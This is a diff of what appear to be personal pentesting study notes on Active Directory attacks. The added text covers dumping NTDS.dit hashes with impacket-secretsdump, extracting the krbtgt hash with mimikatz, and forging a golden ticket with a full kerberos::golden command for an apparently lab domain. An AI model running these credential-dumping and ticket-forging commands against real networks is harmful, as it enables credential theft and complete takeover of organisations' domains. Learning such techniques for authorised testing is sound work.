@@ -8,7 +8,7 @@
 2. Run scans to generate traffic.
 3. If scans are taking too long, look for websites in scope (http_verison).
 4. Look for default credentials on web logins or vulnerabilities.
-5. Try harder.
+5. Try harder. 
 
 ### LLMNR Poisoning
 - Link Local Multicast Name Resolution (LLMNR)
@@ -146,12 +146,12 @@ nxc smb 192.168.110.0/24 -u {administrator} -H {Hash value should look like this
 #### Get hashes with Secretsdump
 - Used to get hashes if you have a regular user password.
 ````bash
-impacket-secretsdump {domain}.local/{username}:{Password}@{IP of user machine}
+impacket-secretsdump {domain}.local/{username}:'{Password}'@{IP of user machine}
 ````
 > You can also add `-hashes {hash}` to the impacket-secretsdump command if you don't have a cracked hash.
 
 - Once you get hashes, use this against all computers in the domain. Re-spray the network until you find vertical access.
-- Then crack the hashes with hashcat (Process listed above).
+- Then crack the hashes with hashcat (Process listed [above](#llmnr-poisoning)).
 
 ## Active Directory: DC Attack (Post account compromise)
 
@@ -247,3 +247,28 @@ You need to load the mimikatz tool onto the target machine and run mimikatz.
     - `sekurlsa::` This will show you what tools are available.
 
 ## Active Directory: Post-domain pwning
+- The goal here is to look for sensitive information in shares and try and maintain some level of persistence.
+
+### NTDS.dit
+- This is a database that stores AD data including user and group information as well as password hashes.
+
+1. Dump the NTDS.dit using a known DC controller admin with:
+````bash
+impacket-secretsdump {domain}.local/{username of DC}:'{Password}'@{IP of DC} -just-dc-ntlm
+````
+
+- We can use this attack with an admin created in the [token_impersonation](#token-impersonation) section.
+
+2. Then crack the hashes with hashcat (Process listed [above](#llmnr-poisoning)).and store them for future use.
+
+### Golden Ticket Attacks
+- When we compromise the krbtgt account we own the domain.
+- We can request access to any resource or system on the domain.
+- Golden tickets == complete access to every machine.
+
+1. Complete steps 1-5 of the [mimikatz attack](#mimikatz).
+2. Run `lsadump::lsa /inject /name:krbtgt` and grab the SID of the domain and the NTLM hash of the krbtgt account.
+
+![](images/golden_ticket.png)
+
+3. Run the following attack to gain access in the domain `kerberos::golden /user:Administrator /domain:roshar.local /sid:S-1-5-21-3079034380-2620794434-64865621 /krbtgt:c3f33fa7027ab1eb01f0856938a99b18 /id:500 /ptt`
